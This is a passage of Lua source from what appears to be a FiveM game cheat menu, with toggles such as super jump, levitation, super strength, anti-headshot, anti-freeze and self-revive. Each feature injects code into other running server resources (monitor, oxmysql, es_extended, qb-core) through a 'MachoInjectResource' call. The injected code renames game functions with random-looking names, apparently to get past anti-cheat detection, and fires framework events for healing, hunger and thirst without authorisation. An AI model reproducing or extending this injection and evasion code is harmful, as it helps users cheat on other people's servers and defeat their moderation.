                                        function(veh) SetVehicleEngineOn(veh, not IsVehicleEngineOn(veh), false, true) end,
                                        function(veh) SetVehicleLights(veh, math.random(0, 2)) end,
                                        function(veh) StartVehicleHorn(veh, 1000, "HELDDOWN", false) end
                                    }
                                    local randomAction = actions[math.random(#actions)]
                                    randomAction(targetEntity)
                                end
                            end
                        end
                    end

                    -- Main Camera Movement Thread (Unchanged)
                    local function cameraThread()
                        local baseSpeed, boostSpeed, slowSpeed = 1.0, 9.0, 0.1; local mouseSensitivity = 7.5; local function clamp(val, min, max) return math.max(min, math.min(max, val)) end; local function rotToDir(rot) local rX, rZ = math.rad(rot.x), math.rad(rot.z); return vector3(-math.sin(rZ)*math.cos(rX), math.cos(rZ)*math.cos(rX), math.sin(rX)) end;
                        while isFreecamActive do
                            Wait(0)
                            local camPos, camRotRaw = GetCamCoord(freecamHandle), GetCamRot(freecamHandle, 2); local camRot = { x = camRotRaw.x, y = camRotRaw.y, z = camRotRaw.z }; local direction = rotToDir(camRot); local right = vector3(direction.y, -direction.x, 0)
                            local speed = baseSpeed; if IsDisabledControlPressed(0, 21) then speed = boostSpeed end; if IsDisabledControlPressed(0, 19) then speed = slowSpeed end
                            if IsDisabledControlPressed(0, 32) then camPos = camPos + direction * speed end; if IsDisabledControlPressed(0, 33) then camPos = camPos - direction * speed end; if IsDisabledControlPressed(0, 34) then camPos = camPos - right * speed end; if IsDisabledControlPressed(0, 35) then camPos = camPos + right * speed end; if IsDisabledControlPressed(0, 22) then camPos = camPos + vector3(0, 0, 1.0) * speed end; if IsDisabledControlPressed(0, 36) then camPos = camPos - vector3(0, 0, 1.0) * speed end
                            local mX, mY = GetControlNormal(0,1)*mouseSensitivity, GetControlNormal(0,2)*mouseSensitivity; camRot.x = clamp(camRot.x-mY, -89.0, 89.0); camRot.z = camRot.z-mX
                            SetCamCoord(freecamHandle, camPos.x, camPos.y, camPos.z); SetCamRot(freecamHandle, camRot.x, camRot.y, camRot.z, 2); SetFocusPosAndVel(camPos.x, camPos.y, camPos.z, 0.0, 0.0, 0.0)
                            local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, camPos.x+direction.x*1000.0, camPos.y+direction.y*1000.0, camPos.z+direction.z*1000.0, -1, PlayerPedId(), 7); local _, hit, coords, _, entity = GetShapeTestResult(ray); if hit then targetCoords, targetEntity = coords, entity else targetCoords, targetEntity = nil, nil end
                        end
                    end
                    
                    startFreecam = function()
                        if isFreecamActive then return end
                        isFreecamActive = true
                        local startPos, startRot, startFov = GetGameplayCamCoord(), GetGameplayCamRot(2), GetGameplayCamFov()
                        freecamHandle = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", startPos.x, startPos.y, startPos.z, startRot.x, startRot.y, startRot.z, startFov, true, 2)
                        
                        if not DoesCamExist(freecamHandle) then isFreecamActive = false; return end

                        RenderScriptCams(true, false, 0, true, true)
                        SetCamActive(freecamHandle, true)
                        CreateThread(drawThread)
                        CreateThread(logicThread)
                        CreateThread(cameraThread)
                    end

                    stopFreecam = function()
                        if not isFreecamActive then return end
                        isFreecamActive = false
                        if freecamHandle and DoesCamExist(freecamHandle) then SetCamActive(freecamHandle, false); RenderScriptCams(false, false, 0, true, true); DestroyCam(freecamHandle, false) end
                        Wait(10); SetFocusEntity(PlayerPedId()); ClearFocus()
                        freecamHandle = nil
                    end
                    
                    CreateThread(function()
                        while g_FreecamFeatureEnabled and not Unloaded do Wait(0)
                            if IsDisabledControlJustPressed(0, 74) then -- H key
                                if isFreecamActive then stopFreecam()
                                else startFreecam() end
                            end
                        end
                    end)
                end
                
                initializeFreecam()
            ]])
        end, function()
            MachoInjectResource((CheckResource("core") and "core") or (CheckResource("es_extended") and "es_extended") or (CheckResource("qb-core") and "qb-core") or (CheckResource("monitor") and "monitor") or "any", [[
                g_FreecamFeatureEnabled = false
                if isFreecamActive and stopFreecam then stopFreecam() end
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Super Jump", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if xCvBnMqWeRtYuIo == nil then xCvBnMqWeRtYuIo = false end
                xCvBnMqWeRtYuIo = true

                local function JcWT5vYEq1()
                    local yLkPwOiUtReAzXc = CreateThread
                    yLkPwOiUtReAzXc(function()
                        while xCvBnMqWeRtYuIo and not Unloaded do
                            local hGfDsAzXcVbNmQw = SetSuperJumpThisFrame
                            local eRtYuIoPaSdFgHj = PlayerPedId()
                            local oPlMnBvCxZlKjHg = PlayerId()

                            hGfDsAzXcVbNmQw(oPlMnBvCxZlKjHg)
                            Wait(0)
                        end
                    end)
                end

                JcWT5vYEq1()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                xCvBnMqWeRtYuIo = false
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Levitation", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                -- make helpers global so other chunks can use them
                function ScaleVector(vect, mult)
                    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
                end

                function AddVectors(vect1, vect2)
                    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
                end

                function ApplyForce(entity, direction)
                    local XroXTNEFqxoWfH = ApplyForceToEntity
                    XroXTNEFqxoWfH(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
                end

                function SubVectors(vect1, vect2)
                    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
                end

                function Oscillate(entity, position, angleFreq, dampRatio)
                    local OBaTQqteIpmZVo = GetEntityVelocity
                    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
                    local pos2 = AddVectors(ScaleVector(OBaTQqteIpmZVo(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
                    local targetPos = SubVectors(pos1, pos2)
                    ApplyForce(entity, targetPos)
                end

                function RotationToDirection(rot)
                    local radZ = math.rad(rot.z)
                    local radX = math.rad(rot.x)
                    local cosX = math.cos(radX)
                    return vector3(
                        -math.sin(radZ) * cosX,
                        math.cos(radZ) * cosX,
                        math.sin(radX)
                    )
                end

                function GetClosestCoordOnLine(startCoords, endCoords, entity)
                    local CDGcdMQhosGVCf = GetShapeTestResult
                    local UaWIFHgeizhHua = StartShapeTestRay
                    local result, hit, hitCoords, surfaceNormal, entityHit =
                        CDGcdMQhosGVCf(UaWIFHgeizhHua(startCoords.x, startCoords.y, startCoords.z, endCoords.x, endCoords.y, endCoords.z, -1, entity, 0))
                    return hit == 1, hitCoords
                end

                function GetCameraLookingAtCoord(distance)
                    local playerPed = PlayerPedId()
                    local camRot = GetGameplayCamRot(2)
                    local camCoord = GetGameplayCamCoord()
                    local forwardVector = RotationToDirection(camRot)
                    local destination = vector3(
                        camCoord.x + forwardVector.x * distance,
                        camCoord.y + forwardVector.y * distance,
                        camCoord.z + forwardVector.z * distance
                    )
                    local hit, endCoords = GetClosestCoordOnLine(camCoord, destination, playerPed)
                    if hit then return endCoords else return destination end
                end
            ]])

            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function awfjawr57awt7f()
                    nxtBFlQWMMeRLs = true

                    local jIiIfikctHYrlH = CreateThread
                    jIiIfikctHYrlH(function()
                        while nxtBFlQWMMeRLs and not Unloaded do
                            Wait(0)
                            local ped = PlayerPedId()

                            local SZxuJlyJQmGlZz = SetPedCanRagdoll
                            local valuOZfymjeVaH = IsEntityPlayingAnim
                            local IiHiLVRagMQhrn = RequestAnimDict
                            local mOZOquvggdnbod = HasAnimDictLoaded
                            local UFZdrZNXpLwpjT = TaskPlayAnim
                            local cQPIZtKyyWaVcY = GetCameraLookingAtCoord
                            local OyvuuAMyvjtIzD = GetGameplayCamRot
                            local XKWvPIkCKMXIfR = IsDisabledControlPressed  -- FIXED: missing '='

                            while XKWvPIkCKMXIfR(0, 22) do
                                SZxuJlyJQmGlZz(ped, false)

                                if not valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                                    IiHiLVRagMQhrn("oddjobs@assassinate@construction@")
                                    while not mOZOquvggdnbod("oddjobs@assassinate@construction@") do
                                        Wait(0)
                                    end
                                    UFZdrZNXpLwpjT(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms",
                                        8.0, -8.0, -1, 49, 0, false, false, false)
                                end

                                local camRot = OyvuuAMyvjtIzD(2)
                                local camHeading = (camRot.z + 360) % 360
                                local direction = cQPIZtKyyWaVcY(77)

                                SetEntityHeading(ped, camHeading)
                                Oscillate(ped, direction, 0.33, 0.9)

                                Wait(1)
                            end

                            if valuOZfymjeVaH(ped, "oddjobs@assassinate@construction@", "unarmed_fold_arms", 3) then
                                ClearPedTasks(ped)
                            end

                            SZxuJlyJQmGlZz(ped, true)
                        end
                    end)
                end

                awfjawr57awt7f()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                nxtBFlQWMMeRLs = false
                ClearPedTasks(PlayerPedId())
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Super Strength", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if fgawjFmaDjdALaO == nil then fgawjFmaDjdALaO = false end
                fgawjFmaDjdALaO = true

                local holdingEntity = false
                local holdingCarEntity = false
                local holdingPed = false
                local heldEntity = nil
                local entityType = nil
                local awfhjawrasfs = CreateThread

                awfhjawrasfs(function()
                    while fgawjFmaDjdALaO and not Unloaded do
                        Wait(0)
                        if holdingEntity and heldEntity then
                            local playerPed = PlayerPedId()
                            local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                            DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[Y] Drop Entity / [U] Attach Ped")
                            
                            if holdingCarEntity and not IsEntityPlayingAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 3) then
                                RequestAnimDict('anim@mp_rollarcoaster')
                                while not HasAnimDictLoaded('anim@mp_rollarcoaster') do
                                    Wait(100)
                                end
                                TaskPlayAnim(playerPed, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
                            elseif (holdingPed or not holdingCarEntity) and not IsEntityPlayingAnim(playerPed, 'anim@heists@box_carry@', 'idle', 3) then
                                RequestAnimDict('anim@heists@box_carry@')
                                while not HasAnimDictLoaded('anim@heists@box_carry@') do
                                    Wait(100)
                                end
                                TaskPlayAnim(playerPed, 'anim@heists@box_carry@', 'idle', 8.0, -8.0, -1, 50, 0, false, false, false)
                            end

                            if not IsEntityAttached(heldEntity) then
                                holdingEntity = false
                                holdingCarEntity = false
                                holdingPed = false
                                heldEntity = nil
                            end
                        end
                    end
                end)

                awfhjawrasfs(function()
                    while fgawjFmaDjdALaO and not Unloaded do
                        Wait(0)
                        local playerPed = PlayerPedId()
                        local camPos = GetGameplayCamCoord()
                        local camRot = GetGameplayCamRot(2)
                        local direction = RotationToDirection(camRot)
                        local dest = vec3(camPos.x + direction.x * 10.0, camPos.y + direction.y * 10.0, camPos.z + direction.z * 10.0)

                        local rayHandle = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, playerPed, 0)
                        local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
                        local validTarget = false

                        if hit == 1 then
                            entityType = GetEntityType(entityHit)
                            if entityType == 3 or entityType == 2 or entityType == 1 then
                                validTarget = true
                                local headPos = GetPedBoneCoords(playerPed, 0x796e, 0.0, 0.0, 0.0)
                                DrawText3Ds(headPos.x, headPos.y, headPos.z + 0.5, "[E] Pick Up / [Y] Drop")
                            end
                        end

                        if IsDisabledControlJustReleased(0, 38) then
                            if validTarget and not holdingEntity then
                                holdingEntity = true
                                heldEntity = entityHit

                                local wfuawruawts = AttachEntityToEntity

                                if entityType == 3 then
                                    wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 0.0, 0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                                elseif entityType == 2 then
                                    holdingCarEntity = true
                                    wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                elseif entityType == 1 then
                                    holdingPed = true
                                    wfuawruawts(heldEntity, playerPed, GetPedBoneIndex(playerPed, 60309), 1.0, 0.5, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 1, true)
                                end
                            end
                        elseif IsDisabledControlJustReleased(0, 246) then
                            if holdingEntity then
                                local wgfawhtawrs = DetachEntity
                                local dfgjsdfuwer = ApplyForceToEntity
                                local sdgfhjwserw = ClearPedTasks

                                wgfawhtawrs(heldEntity, true, true)
                                dfgjsdfuwer(heldEntity, 1, direction.x * 500, direction.y * 500, direction.z * 500, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                holdingEntity = false
                                holdingCarEntity = false
                                holdingPed = false
                                heldEntity = nil
                                sdgfhjwserw(PlayerPedId())
                            end
                        end
                    end
                end)

                function RotationToDirection(rotation)
                    local adjustedRotation = vec3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
                    local direction = vec3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
                    return direction
                end

                function DrawText3Ds(x, y, z, text)
                    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
                    local px, py, pz = table.unpack(GetGameplayCamCoords())
                    local scale = (1 / GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)) * 2
                    local fov = (1 / GetGameplayCamFov()) * 100
                    scale = scale * fov

                    if onScreen then
                        SetTextScale(0.0 * scale, 0.35 * scale)
                        SetTextFont(0)
                        SetTextProportional(1)
                        SetTextColour(255, 255, 255, 215)
                        SetTextDropshadow(0, 0, 0, 0, 155)
                        SetTextEdge(2, 0, 0, 0, 150)
                        SetTextDropShadow()
                        -- SetTextOutline()
                        SetTextEntry("STRING")
                        SetTextCentre(1)
                        AddTextComponentString(text)
                        DrawText(_x, _y)
                    end
                end
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                fgawjFmaDjdALaO = false
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Super Punch", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if qWeRtYuIoPlMnBv == nil then qWeRtYuIoPlMnBv = false end
                qWeRtYuIoPlMnBv = true

                local function NdaFBuHkvo()
                    local uTrEsAzXcVbNmQw = CreateThread
                    uTrEsAzXcVbNmQw(function()
                        while qWeRtYuIoPlMnBv and not Unloaded do
                            local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
                            local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
                            local bNmQwErTyUiOpAs = SetWeaponDamageModifier
                            local sDfGhJkLqWeRtYu = PlayerId()
                            local DamageRateValue = 150.0
                            local WeaponNameForDamage = "WEAPON_UNARMED"


                            nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, DamageRateValue)
                            cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, DamageRateValue)
                            bNmQwErTyUiOpAs(GetHashKey(WeaponNameForDamage), DamageRateValue)

                            Wait(0)
                        end
                    end)
                end

                NdaFBuHkvo()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local qWeRtYuIoPlMnBv = false
                local nBvCxZlKjHgFdSa = SetPlayerMeleeWeaponDamageModifier
                local cVbNmQwErTyUiOp = SetPlayerVehicleDamageModifier
                local bNmQwErTyUiOpAs = SetWeaponDamageModifier
                local sDfGhJkLqWeRtYu = PlayerId()

                nBvCxZlKjHgFdSa(sDfGhJkLqWeRtYu, 1.0)
                cVbNmQwErTyUiOp(sDfGhJkLqWeRtYu, 1.0)
                bNmQwErTyUiOpAs(GetHashKey("WEAPON_UNARMED"), 1.0)
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Throw From Vehicle", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if zXpQwErTyUiPlMn == nil then zXpQwErTyUiPlMn = false end
                zXpQwErTyUiPlMn = true

                local function qXzRP7ytKW()
                    local iLkMzXvBnQwSaTr = CreateThread
                    iLkMzXvBnQwSaTr(function()
                        while zXpQwErTyUiPlMn and not Unloaded do
                            local vBnMaSdFgTrEqWx = SetRelationshipBetweenGroups
                            vBnMaSdFgTrEqWx(5, GetHashKey('PLAYER'), GetHashKey('PLAYER'))
                            Wait(0)
                        end
                    end)
                end

                qXzRP7ytKW()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                zXpQwErTyUiPlMn = false
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Force Third Person", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                kJfGhTrEeWqAsDz = true

                local function pqkTRWZ38y()
                    local gKdNqLpYxMiV = CreateThread
                    gKdNqLpYxMiV(function()
                        while kJfGhTrEeWqAsDz and not Unloaded do
                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                            qWeRtYuIoPlMnBv(0)
                            aSdFgHjKlQwErTy(0)
                            Wait(0)
                        end
                    end)
                end

                pqkTRWZ38y()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                kJfGhTrEeWqAsDz = false
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Force Driveby", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
                zXcVbNmQwErTyUi = true

                local function UEvLBcXqM6()
                    local cVbNmAsDfGhJkLz = CreateThread
                    cVbNmAsDfGhJkLz(function()
                        while zXcVbNmQwErTyUi and not Unloaded do
                            local lKjHgFdSaZxCvBn = SetPlayerCanDoDriveBy
                            local eRtYuIoPaSdFgHi = PlayerPedId()

                            lKjHgFdSaZxCvBn(eRtYuIoPaSdFgHi, true)
                            Wait(0)
                        end
                    end)
                end

                UEvLBcXqM6()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                zXcVbNmQwErTyUi = false
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Anti-Headshot", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if yHnvrVNkoOvGMWiS == nil then yHnvrVNkoOvGMWiS = false end
                yHnvrVNkoOvGMWiS = true

                local eeitKYqDwYbPslTW = CreateThread
                local function LIfbdMbeIAeHTnnx()
                    eeitKYqDwYbPslTW(function()
                        while yHnvrVNkoOvGMWiS and not Unloaded do
                            local fhw72q35d8sfj = SetPedSuffersCriticalHits
                            fhw72q35d8sfj(PlayerPedId(), false)
                            Wait(0)
                        end
                    end)
                end

                LIfbdMbeIAeHTnnx()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                yHnvrVNkoOvGMWiS = false
                fhw72q35d8sfj(PlayerPedId(), true)
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Anti-Freeze", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if nHgFdSaZxCvBnMq == nil then nHgFdSaZxCvBnMq = false end
                nHgFdSaZxCvBnMq = true

                local sdfw3w3tsdg = CreateThread
                local function XELa6FJtsB()
                    sdfw3w3tsdg(function()
                        while nHgFdSaZxCvBnMq and not Unloaded do
                            local fhw72q35d8sfj = FreezeEntityPosition
                            local segfhs347dsgf = ClearPedTasks

                            if IsEntityPositionFrozen(PlayerPedId()) then
                                fhw72q35d8sfj(PlayerPedId(), false)
                                segfhs347dsgf(PlayerPedId())
                            end
                            
                            Wait(0)
                        end
                    end)
                end

                XELa6FJtsB()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                nHgFdSaZxCvBnMq = false
            ]])
        end)

        MachoMenuCheckbox(PlayerTabSections[1], "Anti-Blackscreen", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if aDjsfmansdjwAEl == nil then aDjsfmansdjwAEl = false end
                aDjsfmansdjwAEl = true

                local sdfw3w3tsdg = CreateThread
                local function XELWAEDa6FJtsB()
                    sdfw3w3tsdg(function()
                        while aDjsfmansdjwAEl and not Unloaded do
                            DoScreenFadeIn(0)
                            Wait(0)
                        end
                    end)
                end

                XELWAEDa6FJtsB()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                aDjsfmansdjwAEl = false
            ]])
        end)

        local ModelNameHandle = MachoMenuInputbox(PlayerTabSections[2], "Model Name:", "...")

        MachoMenuButton(PlayerTabSections[2], "Change Model", function()
            local ModelName = MachoMenuGetInputbox(ModelNameHandle)

            if type(ModelName) == "string" and ModelName ~= "" then
                local Code = string.format([[
                    local function GykR8qjWTp()
                        local nHgFdSaZxCvBnMq = RequestModel
                        local xCvBnMqWeRtYuIo = HasModelLoaded
                        local aSdFgHjKlQwErTy = SetPlayerModel
                        local oPlMnBvCxZlKjHg = SetPedDefaultComponentVariation

                        nHgFdSaZxCvBnMq(GetHashKey("%s"))
                        while not xCvBnMqWeRtYuIo(GetHashKey("%s")) do
                            Wait(1)
                        end
                        
                        aSdFgHjKlQwErTy(PlayerId(), GetHashKey("%s"))
                        oPlMnBvCxZlKjHg(PlayerPedId())
                    end

                    GykR8qjWTp()
                ]], ModelName, ModelName, ModelName)

                MachoInjectResource(CheckResource("oxmysql") and "oxmysql" or "any", Code)
            end
        end)

        MachoMenuButton(PlayerTabSections[2], "White Thug Drip", function()
            function WhiteThugDrip()
                local ped = PlayerPedId()

                -- Jacket
                SetPedComponentVariation(ped, 11, 109, 0, 2)
                -- Shirt/Undershirt
                SetPedComponentVariation(ped, 8, 15, 0, 2)
                -- Hands
                SetPedComponentVariation(ped, 3, 5, 0, 2)
                -- Legs
                SetPedComponentVariation(ped, 4, 56, 0, 2)
                -- Shoes
                SetPedComponentVariation(ped, 6, 19, 0, 2)
                -- Hat
                SetPedPropIndex(ped, 0, 1, 0, true)
            end

            WhiteThugDrip()
        end)

        MachoMenuButton(PlayerTabSections[2], "JTG Mafia Drip", function()
            function JTGMafia()
                local ped = PlayerPedId()

                -- Jacket
                SetPedComponentVariation(ped, 11, 5, 0, 2)
                -- Shirt/Undershirt
                SetPedComponentVariation(ped, 8, 15, 0, 2)
                -- Hands
                SetPedComponentVariation(ped, 3, 5, 0, 2)
                -- Legs
                SetPedComponentVariation(ped, 4, 42, 0, 2)
                -- Shoes
                SetPedComponentVariation(ped, 6, 6, 0, 2)
                -- Hat
                SetPedPropIndex(ped, 0, 26, 0, true)
                -- Glasses
                SetPedPropIndex(ped, 1, 3, 0, true)
            end

            JTGMafia()
        end)

        MachoMenuButton(PlayerTabSections[3], "Heal", function()
            SetEntityHealth(PlayerPedId(), 200)
        end)

        MachoMenuButton(PlayerTabSections[3], "Armor", function()
            SetPedArmour(PlayerPedId(), 100)
        end)

        MachoMenuButton(PlayerTabSections[3], "Fill Hunger", function()
            MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function DawrjatjsfAW()
                    TriggerEvent('esx_status:set', 'hunger', 1000000)
                end

                DawrjatjsfAW()
            ]])
        end)

        MachoMenuButton(PlayerTabSections[3], "Fill Thirst", function()
            MachoInjectResource2(3, CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function sWj238fsMAw()
                    TriggerEvent('esx_status:set', 'thirst', 1000000)
                end

                sWj238fsMAw()
            ]])
        end)

        MachoMenuButton(PlayerTabSections[3], "Revive", function()
            MachoInjectResource2(3, CheckResource("ox_inventory") and "ox_inventory" or CheckResource("ox_lib") and "ox_lib" or CheckResource("es_extended") and "es_extended" or CheckResource("qb-core") and "qb-core" or CheckResource("wasabi_ambulance") and "wasabi_ambulance" or CheckResource("ak47_ambulancejob") and "ak47_ambulancejob" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function AcjU5NQzKw()
                    if GetResourceState('prp-injuries') == 'started' then
                        TriggerEvent('prp-injuries:hospitalBedHeal', skipHeal)
                        return
                    end

                    if GetResourceState('es_extended') == 'started' then
                        TriggerEvent("esx_ambulancejob:revive")
                        return
                    end

                    if GetResourceState('qb-core') == 'started' then
                        TriggerEvent("hospital:client:Revive")
                        return
                    end

                    if GetResourceState('wasabi_ambulance') == 'started' then
                        TriggerEvent("wasabi_ambulance:revive")
                        return
                    end

                    if GetResourceState('ak47_ambulancejob') == 'started' then
                        TriggerEvent("ak47_ambulancejob:revive")
                        return
                    end

                    NcVbXzQwErTyUiO = GetEntityHeading(PlayerPedId())
                    BvCxZlKjHgFdSaP = GetEntityCoords(PlayerPedId())

                    RtYuIoPlMnBvCxZ = NetworkResurrectLocalPlayer
                    RtYuIoPlMnBvCxZ(BvCxZlKjHgFdSaP.x, BvCxZlKjHgFdSaP.y, BvCxZlKjHgFdSaP.z, NcVbXzQwErTyUiO, false, false, false, 1, 0)
                end

                AcjU5NQzKw()
            ]])
        end)

        MachoMenuButton(PlayerTabSections[3], "Suicide", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function RGybF0JqEt()
                    local aSdFgHjKlQwErTy = SetEntityHealth
                    aSdFgHjKlQwErTy(PlayerPedId(), 0)
                end

                RGybF0JqEt()
            ]])
        end)

        MachoMenuButton(PlayerTabSections[3], "Force Ragdoll", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function awfAEDSADWEf()
                    local cWAmdjakwDksFD = SetPedToRagdoll
                    cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                end

                awfAEDSADWEf()
            ]])
        end)

        MachoMenuButton(PlayerTabSections[3], "Clear Task", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function iPfT7kN3dU()
                    local zXcVbNmAsDfGhJk = ClearPedTasksImmediately
                    zXcVbNmAsDfGhJk(PlayerPedId())
                end

                iPfT7kN3dU()
            ]])
        end)

        MachoMenuButton(PlayerTabSections[3], "Clear Vision", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function MsVqZ29ptY()
                    local qWeRtYuIoPlMnBv = ClearTimecycleModifier
                    local kJfGhTrEeWqAsDz = ClearExtraTimecycleModifier

                    qWeRtYuIoPlMnBv()
                    kJfGhTrEeWqAsDz()
                end

                MsVqZ29ptY()
            ]])
        end)

        MachoMenuButton(PlayerTabSections[3], "Randomize Outfit", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function UxrKYLp378()
                    local UwEsDxCfVbGtHy = PlayerPedId
                    local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                    local QwAzXsEdCrVfBg = SetPedComponentVariation
                    local LkJhGfDsAqWeRt = SetPedHeadBlendData
                    local MnBgVfCdXsZaQw = SetPedHairColor
                    local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                    local TyUiOpAsDfGhJk = SetPedHeadOverlay
                    local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                    local DfGhJkLzXcVbNm = ClearPedProp

                    local function PqLoMzNkXjWvRu(component, exclude)
                        local ped = UwEsDxCfVbGtHy()
                        local total = FdSaQwErTyUiOp(ped, component)
                        if total <= 1 then return 0 end
                        local choice = exclude
                        while choice == exclude do
                            choice = math.random(0, total - 1)
                        end
                        return choice
                    end

                    local function OxVnBmCxZaSqWe(component)
                        local ped = UwEsDxCfVbGtHy()
                        local total = FdSaQwErTyUiOp(ped, component)
                        return total > 1 and math.random(0, total - 1) or 0
                    end

                    local ped = UwEsDxCfVbGtHy()

                    QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                    QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                    QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                    QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                    QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                    local face = math.random(0, 45)
                    local skin = math.random(0, 45)
